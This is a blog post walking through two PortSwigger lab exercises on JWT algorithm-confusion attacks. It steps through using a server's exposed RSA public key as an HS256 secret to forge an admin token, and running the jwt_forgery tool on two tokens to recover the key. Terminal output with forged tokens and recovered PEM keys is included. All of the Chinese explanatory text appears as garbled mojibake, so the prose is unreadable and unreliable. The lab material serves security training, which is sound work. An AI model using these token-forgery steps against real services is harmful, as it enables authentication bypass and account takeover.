<p>æ³¨ï¼šç”¨äºç­¾åçš„å¯¹ç§°åŠ å¯†ç®—æ³•çš„å¯†é’¥å¿…é¡»ä¸æœåŠ¡å™¨ä¸Šå­˜å‚¨çš„å…¬é’¥å®Œå…¨ç›¸åŒã€‚è¿™åŒ…æ‹¬ä½¿ç”¨ç›¸åŒçš„æ ¼å¼ï¼ˆä¾‹å¦‚ X.509 PEMï¼‰å¹¶ä¿ç•™ä»»ä½•éæ‰“å°å­—ç¬¦ï¼ˆä¾‹å¦‚æ¢è¡Œç¬¦ï¼‰ã€‚</p>
<hr>
<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion0"><strong>Lab 7: JWT authentication bypass via algorithm confusion</strong></a></p>
<p><strong>ç¬¬ä¸€æ­¥ï¼šå…ˆè·å¾—æœåŠ¡å™¨çš„å…¬é’¥</strong></p>
<p>ç™»é™†å·²çŸ¥çš„è´¦å·ä¹‹åï¼ŒæŠ“å–æ•°æ®åŒ…åˆ†æJWTå‘ç°è¯¥æœåŠ¡å™¨ä½¿ç”¨çš„æ˜¯RS256éªŒè¯ç®—æ³•ï¼Œå³ä½¿ç”¨ç§é’¥ç­¾åï¼Œå…¬é’¥éªŒè¯ã€‚è¦æˆåŠŸä¼ªé€ JWTï¼Œå°±è¦å…ˆè·å¾—æœåŠ¡å™¨çš„å…¬é’¥ã€‚</p>
<p>æœåŠ¡å™¨æœ‰æ—¶ä¼šé€šè¿‡æ˜ å°„åˆ° &#x2F;jwks.json æˆ– &#x2F;.well-known&#x2F;jwks.json çš„æ ‡å‡†ç«¯ç‚¹å°†å…¶å…¬é’¥å…¬å¼€ä¸º JWKå¯¹è±¡ã€‚å³ä½¿å…¬é’¥æ²¡æœ‰è¢«å…¬å¼€ï¼Œä½†æ˜¯æˆ‘ä»¬ä¹Ÿå¯ä»¥ä»ä¸€å¯¹JWTä¸­è¿›è¡Œæå–ï¼ˆLab 8çš„å†…å®¹ï¼‰ã€‚</p>
<p>åœ¨æœ¬æ¬¡å®éªŒä¸­å…¬é’¥æ˜ å°„åˆ°äº†&#x2F;jwks.json</p>
<p><a href="/../img/JWT-attacks/7-1.png" title="7-1" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/7-1.png" alt="7-1"></a></p>
<p>æˆ‘ä»¬å°†JWK Setä¸­çš„å…¬é’¥å¤åˆ¶åˆ°Burp Suiteä¸­ï¼Œç”Ÿæˆä¸€ä¸ªRSAå…¬é’¥å¯¹è±¡ã€‚</p>
<p><a href="/../img/JWT-attacks/7-2.png" title="7-2" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/7-2.png" alt="7-2"></a></p>
<p><strong>ç¬¬äºŒæ­¥ï¼šå°†å…¬é’¥ä½œä¸ºå¯¹ç§°åŠ å¯†ç®—æ³•çš„å¯†é’¥</strong></p>
<p>ç„¶åæˆ‘ä»¬å°†å…¶è½¬æ¢ä¸ºPEMæ ¼å¼ï¼Œç„¶åå°†å…¬é’¥PEMæ ¼å¼çš„å†…å®¹å…¨éƒ¨è¿›è¡ŒBase64ç¼–ç ã€‚</p>
<p><a href="/../img/JWT-attacks/7-3.png" title="7-3" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/7-3.png" alt="7-3"></a></p>
<p>å†éšä¾¿ç”Ÿæˆä¸€ä¸ªå¯¹ç§°åŠ å¯†ç®—æ³•çš„å¯†é’¥ï¼Œç„¶åå°†ä¸Šé¢Base64ç¼–ç çš„ç»“æœå¤åˆ¶åˆ°åˆšç”Ÿæˆçš„å¯†é’¥çš„Kå‚æ•°ä¸Šã€‚</p>
<p><a href="/../img/JWT-attacks/7-4.png" title="7-4" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/7-4.png" alt="7-4"></a></p>
<p><strong>ç¬¬ä¸‰æ­¥ï¼šä¿®æ”¹headerï¼Œå’Œpayload</strong></p>
<p><a href="/../img/JWT-attacks/7-5.png" title="7-5" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/7-5.png" alt="7-5"></a></p>
<p>æ³¨æ„ï¼Œkidä¸è¦æ”¹ï¼Œkidæœ¬èº«å°±ä¸æœåŠ¡å™¨ä¸Šçš„å…¬é’¥çš„kidä¸€è‡´ã€‚</p>
<p><strong>ç¬¬å››æ­¥ï¼šç”¨å¯¹ç§°åŠ å¯†ç®—æ³•å¯†é’¥ç­¾åï¼Œå¹¶å‘é€è¯·æ±‚</strong></p>
<p>ç‚¹å‡»SignæŒ‰é’®ï¼Œä½¿ç”¨åˆšåˆšåˆ›å»ºçš„å¯¹ç§°åŠ å¯†ç®—æ³•çš„å¯†é’¥ï¼Œä½¿ç”¨HS256ç®—æ³•è¿›è¡Œç­¾åï¼Œç„¶åç‚¹å‡»Sendå‘é€è¯·æ±‚ï¼Œå³å¯è¿›å…¥&#x2F;adminç®¡ç†å‘˜é¡µé¢ï¼Œåˆ é™¤carlosç”¨æˆ·å®Œæˆå®éªŒã€‚<a href="/../img/JWT-attacks/7-6.png" title="7-6" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/7-6.png" alt="7-6"></a></p>
<hr>
<p>ä½†å¦‚æœï¼ŒæœåŠ¡å™¨å¹¶æ²¡æœ‰æŠŠpublic keyå…¬å¼€å‘¢ï¼Ÿ</p>
<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key"><strong>Lab 8: JWT authentication bypass via algorithm confusion with no exposed key</strong></a></p>
<p>å¯ä»¥ä½¿ç”¨å·¥å…·<a target="_blank" rel="noopener" href="https://github.com/silentsignal/rsa_sign2n">jwt_forger</a>ï¼Œä»–ä¼šä½¿ç”¨æˆ‘ä»¬æä¾›çš„ JWT æ¥è®¡ç®— n çš„ä¸€ä¸ªæˆ–å¤šä¸ªæ½œåœ¨å€¼ã€‚å…¶ä¸­åªæœ‰ä¸€ä¸ªä¸æœåŠ¡å™¨å¯†é’¥ä½¿ç”¨çš„ n å€¼åŒ¹é…ï¼Œè¯¥ç¨‹åºå°±ä¼šå°†å…¶ä¿å­˜ä¸ºx509æ ¼å¼æˆ–è€…pkcs1æ ¼å¼çš„pemæ–‡ä»¶ã€‚è¿™æ ·å°±å¯ä»¥è·å¾—æœåŠ¡å™¨çš„å…¬é’¥ï¼Œå®æ–½ç®—æ³•æ··æ·†æ”»å‡»ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jwt_forgery &lt;token1&gt; &lt;token2&gt;</span><br></pre></td></tr></table></figure>

<p>jwt_forgerå‘½ä»¤è¡Œå®é™…è¿è¡Œæ•ˆæœï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">root@ecdfab3005f4:/app<span class="comment"># python3 jwt_forgery.py eyJraWQiOiIzZjRhZjRiMS1mY2M1LTQwZjUtODM4My02NGRmZjI3NGE0NDUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY5MTE0MTQwMn0.Bl2KswJWpEeSRhAb03UiXq9-4a_Powo-bLTj1HD2nlEeu8uDGp2NhPeLRnMwq4hFtj8lW811nymxU3Q--Fig5hbuJhUh1wolTfir7CattvAmTRC-i88URUs-oIH6BvMYbbD0dNMhNt-9uaamJ413vh9GH6glojM1ph_Bg6awqLntoioyv_PV6VSA12x6NHKNMq-0bs2GAxOCBoHvFFuq5hBU5HYfCg8ExdXbewwqJjLRqnkwyjJ6lKf24iVbe7uiYrSH1wUQZl2_Q7Fu0ly7houPCBIkuJbAs0-YrAIvjKfNPKPZszXFceZysFYdi4u0oA0o-lbTcwnpm_juoYWvhw eyJraWQiOiIzZjRhZjRiMS1mY2M1LTQwZjUtODM4My02NGRmZjI3NGE0NDUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY5MTE0MTY2Mn0.CPrJ7dQEg-rVuHNrtHdHJfiUkxwnT7UmY8B_NMqlS2RutXG9BGtkHy-pMc9QS7twcUnw9zv0Hfvf49bAcUb7wFgQ53SPB9r5OsuRw0BwPuxJVheoGCSbvdeW6tD8PivV5yqDEJOnkaYuxFYeaeIs85YxusgRj_OnKlWvhROICAE7kYe7RnLzrYX3_WiU-bIWT-WMEWcr1FwK2RF7DWb48DF0W-gETdl-n2AYiEsa2VbSHnt2vH4gvBVjNPxLr7IuTEYHr7H-S2YDN4-0p6TBcKnkoaJzTYSt1XWnsYbnyjq0kmzEDaToaA7cPGkNvWAmZzD_NBNm2mQry_S4VknKzA</span></span><br><span class="line">[*] GCD:  0x1</span><br><span class="line">[*] GCD:  0x9eabc94b42906dfbd53b8c8ed075991090638c92214b85f5369da0b809359a60eb12004bd425e8f75e1a9c43dd0770ef488d3d8eaf08620dd9b3766ac31b36987844086c14c2dcf1c8ab91f5450ab201110078cf22c70d8dbe25bd095a947e34307490905470b4f9564548fb8fc0c332002c357e81537e97a7a1053e819eaa2a7b77885b89ec9126ed4e3c7c761f632b195b3faa9e0ce381f1ee5302f7020b51155937554977fc77d6d11b27d5f5d3f8d5c66daa4a4850f196bac4215f93cef55d1b28616f82ed1f27b16b94d0e87fa9f630d291a97f1e9f22eda282e27cf71a6e573813ebda43e4ed7ac635dd04750418816237e43b35c83f6498f3385e0f99</span><br><span class="line">[+] Found n with multiplier 1  :</span><br><span class="line"> 0x9eabc94b42906dfbd53b8c8ed075991090638c92214b85f5369da0b809359a60eb12004bd425e8f75e1a9c43dd0770ef488d3d8eaf08620dd9b3766ac31b36987844086c14c2dcf1c8ab91f5450ab201110078cf22c70d8dbe25bd095a947e34307490905470b4f9564548fb8fc0c332002c357e81537e97a7a1053e819eaa2a7b77885b89ec9126ed4e3c7c761f632b195b3faa9e0ce381f1ee5302f7020b51155937554977fc77d6d11b27d5f5d3f8d5c66daa4a4850f196bac4215f93cef55d1b28616f82ed1f27b16b94d0e87fa9f630d291a97f1e9f22eda282e27cf71a6e573813ebda43e4ed7ac635dd04750418816237e43b35c83f6498f3385e0f99</span><br><span class="line">[+] Written to 9eabc94b42906dfb_65537_x509.pem</span><br><span class="line">[+] Tampered JWT: b<span class="string">&#x27;eyJraWQiOiIzZjRhZjRiMS1mY2M1LTQwZjUtODM4My02NGRmZjI3NGE0NDUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAic3ViIjogIndpZW5lciIsICJleHAiOiAxNjkxMjI0NjQ3fQ.AYG4nDBhtzoWcU685taZmRQqML7GaZrFtLzgMOBTjiE&#x27;</span></span><br><span class="line">[+] Written to 9eabc94b42906dfb_65537_pkcs1.pem</span><br><span class="line">[+] Tampered JWT: b<span class="string">&#x27;eyJraWQiOiIzZjRhZjRiMS1mY2M1LTQwZjUtODM4My02NGRmZjI3NGE0NDUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAic3ViIjogIndpZW5lciIsICJleHAiOiAxNjkxMjI0NjQ3fQ.F0iHCARSbO2x5TXcMaPb8BgWa-V6oTwZcTbfAFHSaEA&#x27;</span></span><br><span class="line">================================================================================</span><br><span class="line">Here are your JWT<span class="string">&#x27;s once again for your copypasting pleasure</span></span><br><span class="line"><span class="string">================================================================================</span></span><br><span class="line"><span class="string">eyJraWQiOiIzZjRhZjRiMS1mY2M1LTQwZjUtODM4My02NGRmZjI3NGE0NDUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAic3ViIjogIndpZW5lciIsICJleHAiOiAxNjkxMjI0NjQ3fQ.AYG4nDBhtzoWcU685taZmRQqML7GaZrFtLzgMOBTjiE</span></span><br><span class="line"><span class="string">eyJraWQiOiIzZjRhZjRiMS1mY2M1LTQwZjUtODM4My02NGRmZjI3NGE0NDUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAic3ViIjogIndpZW5lciIsICJleHAiOiAxNjkxMjI0NjQ3fQ.F0iHCARSbO2x5TXcMaPb8BgWa-V6oTwZcTbfAFHSaEA</span></span><br><span class="line"><span class="string">root@ecdfab3005f4:/app# dir</span></span><br><span class="line"><span class="string">9eabc94b42906dfb_65537_pkcs1.pem  Dockerfile  jwt_forgery.py  requirements.txt</span></span><br><span class="line"><span class="string">9eabc94b42906dfb_65537_x509.pem   README.md   pkcs1.asn       x509.asn</span></span><br><span class="line"><span class="string">root@ecdfab3005f4:/app# cat 9eabc94b42906dfb_65537_x509.pem</span></span><br><span class="line"><span class="string">-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnqvJS0KQbfvVO4yO0HWZ</span></span><br><span class="line"><span class="string">EJBjjJIhS4X1Np2guAk1mmDrEgBL1CXo914anEPdB3DvSI09jq8IYg3Zs3Zqwxs2</span></span><br><span class="line"><span class="string">mHhECGwUwtzxyKuR9UUKsgERAHjPIscNjb4lvQlalH40MHSQkFRwtPlWRUj7j8DD</span></span><br><span class="line"><span class="string">MgAsNX6BU36Xp6EFPoGeqip7d4hbieyRJu1OPHx2H2MrGVs/qp4M44Hx7lMC9wIL</span></span><br><span class="line"><span class="string">URVZN1VJd/x31tEbJ9X10/jVxm2qSkhQ8Za6xCFfk871XRsoYW+C7R8nsWuU0Oh/</span></span><br><span class="line"><span class="string">qfYw0pGpfx6fIu2iguJ89xpuVzgT69pD5O16xjXdBHUEGIFiN+Q7Ncg/ZJjzOF4P</span></span><br><span class="line"><span class="string">mQIDAQAB</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----</span></span><br><span class="line"><span class="string">root@ecdfab3005f4:/app# cat 9eabc94b42906dfb_65537_pkcs1.pem</span></span><br><span class="line"><span class="string">-----BEGIN RSA PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIIBCgKCAQEAnqvJS0KQbfvVO4yO0HWZEJBjjJIhS4X1Np2guAk1mmDrEgBL1CXo</span></span><br><span class="line"><span class="string">914anEPdB3DvSI09jq8IYg3Zs3Zqwxs2mHhECGwUwtzxyKuR9UUKsgERAHjPIscN</span></span><br><span class="line"><span class="string">jb4lvQlalH40MHSQkFRwtPlWRUj7j8DDMgAsNX6BU36Xp6EFPoGeqip7d4hbieyR</span></span><br><span class="line"><span class="string">Ju1OPHx2H2MrGVs/qp4M44Hx7lMC9wILURVZN1VJd/x31tEbJ9X10/jVxm2qSkhQ</span></span><br><span class="line"><span class="string">8Za6xCFfk871XRsoYW+C7R8nsWuU0Oh/qfYw0pGpfx6fIu2iguJ89xpuVzgT69pD</span></span><br><span class="line"><span class="string">5O16xjXdBHUEGIFiN+Q7Ncg/ZJjzOF4PmQIDAQAB</span></span><br><span class="line"><span class="string">-----END RSA PUBLIC KEY-----</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹å‡ºjwt_forgerå·²ç»æŠŠå…¬é’¥åˆ†ä¸ºä¸¤ä¸ªæ ¼å¼å­˜å…¥æ–‡ä»¶äº†ï¼Œåˆ†åˆ«ä½¿ç”¨ä¸¤ä¸ªå½¢å¼çš„å…¬é’¥è¿›è¡Œå°è¯•å°±å¯ä»¥äº†ã€‚æœ€åä½¿ç”¨x509æ ¼å¼çš„å…¬é’¥æˆåŠŸå®Œæˆäº†å®éªŒã€‚</p>
<p><a href="/../img/JWT-attacks/8-1.png" title="8-1" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/8-1.png" alt="8-1"></a></p>
</div>
    </div>

    <div class="post-meta">
        <i>
        
            <span>2023-08-04</span>
            
                <span>è¯¥ç¯‡æ–‡ç« è¢« jay1an</span>
            
            
                <span>æ‰“ä¸Šæ ‡ç­¾:
                    
                    
                        <a href='/tags/%E8%BA%AB%E4%BB%BD%E4%BC%AA%E9%80%A0/'>
                            èº«ä»½ä¼ªé€ 
                        </a>
                    
                        <a href='/tags/web%E5%AE%89%E5%85%A8/'>
                            webå®‰å…¨
                        </a>
                    
                        <a href='/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/'>
                            å¯†ç å­¦
                        </a>
                    
                </span>
             
             
                <span>å½’ä¸ºåˆ†ç±»:
                    
                    
                        <a href='/categories/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8/'>
                            ç½‘ç»œç©ºé—´å®‰å…¨
                        </a>
                    
                </span>
            
        
        </i>
    </div>
    <br>
    
    
        
            
    
            <div class="post-footer-pre-next">
                
                    <span>ä¸Šä¸€ç¯‡ï¼š<a href='/2023/09/13/Google-Hacking/'>Google Hacking</a></span>
                

                
                    <span class="post-footer-pre-next-last-span-right">ä¸‹ä¸€ç¯‡ï¼š<a href="/2023/08/03/upload-labs/">Upload Labs</a>
                    </span>
                
            </div>
    
        
    

    
        

     
</div>



                                      
                    
                    
                    <div class="footer">
    
        <span> 
            Â© 1949-2024 Jay1an 

            
                

            
        </span>
       
    
</div>



<!--è¿™æ˜¯æŒ‡ä¸€æ¡çº¿å¾€ä¸‹çš„å†…å®¹-->
<div class="footer-last">
    
            <span>ä»å¤´åŠªåŠ›ä¹Ÿåå·</span>
            
                <span class="footer-last-span-right"><i>æœ¬ç«™ç”±<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>é©±åŠ¨ï½œä½¿ç”¨<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>ä¸»é¢˜</i></span>
            
    
</div>


    
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>

    <!--ç›®å½•-->
    
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
        
<script src="/js/toc.js"></script>

    

    
<script src="/js/randomHeaderContent.js"></script>

    <!--å›åˆ°é¡¶éƒ¨æŒ‰é’®-->
    
        
<script src="/js/returnToTop.js"></script>

    

    
        
<script src="/js/returnToLastPage.js"></script>

    





<script src="/js/lightgallery/lightgallery.umd.min.js"></script>



<script src="/js/lightgallery/plugins/lg-thumbnail.umd.min.js"></script>



<script src="/js/lightgallery/plugins/lg-fullscreen.umd.min.js"></script>


<script src="/js/lightgallery/plugins/lg-autoplay.umd.min.js"></script>


<script src="/js/lightgallery/plugins/lg-zoom.umd.min.js"></script>


<script src="/js/lightgallery/plugins/lg-rotate.umd.min.js"></script>


<script src="/js/lightgallery/plugins/lg-paper.umd.min.js"></script>




<script type="text/javascript">
     
    if (typeof lightGallery !== "undefined") {
        var options1 = {
            selector: '.gallery-item',
            plugins: [lgThumbnail, lgFullscreen, lgAutoplay, lgZoom, lgRotate, lgPager], // å¯ç”¨æ’ä»¶
            thumbnail: true,          // æ˜¾ç¤ºç¼©ç•¥å›¾
            zoom: true,               // å¯ç”¨ç¼©æ”¾åŠŸ
            rotate: true,             // å¯ç”¨æ—‹è½¬åŠŸèƒ½èƒ½
            autoplay: true,        // å¯ç”¨è‡ªåŠ¨æ’­æ”¾åŠŸèƒ½
            fullScreen: true,      // å¯ç”¨å…¨å±åŠŸèƒ½
            pager: false, //é¡µç ,
            zoomFromOrigin: true,   // ä»åŸå§‹ä½ç½®ç¼©æ”¾
            actualSize: true,       // å¯ç”¨æŸ¥çœ‹å®é™…å¤§å°çš„åŠŸèƒ½
            enableZoomAfter: 300,    // å»¶è¿Ÿç¼©æ”¾ï¼Œç¡®ä¿å›¾ç‰‡åŠ è½½å®Œæˆåå¯ç¼©æ”¾
        };
        lightGallery(document.getElementsByClassName('.article-gallery')[0], options1); // ä¿®å¤é€‰æ‹©å™¨
    }
    
</script>


    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script> 

                </div>
            
            
                <!-- å›åˆ°é¡¶éƒ¨çš„æŒ‰é’®-->  
                <div class="progress-wrap shadow-drop-2-bottom">
                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
                    </svg>
                </div>
            
            
                <!-- è¿”å›çš„æŒ‰é’®-->  
                <div class="return-to-last-progress-wrap shadow-drop-2-bottom">
                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
                    </svg>
                </div>
            
    </body>
</html>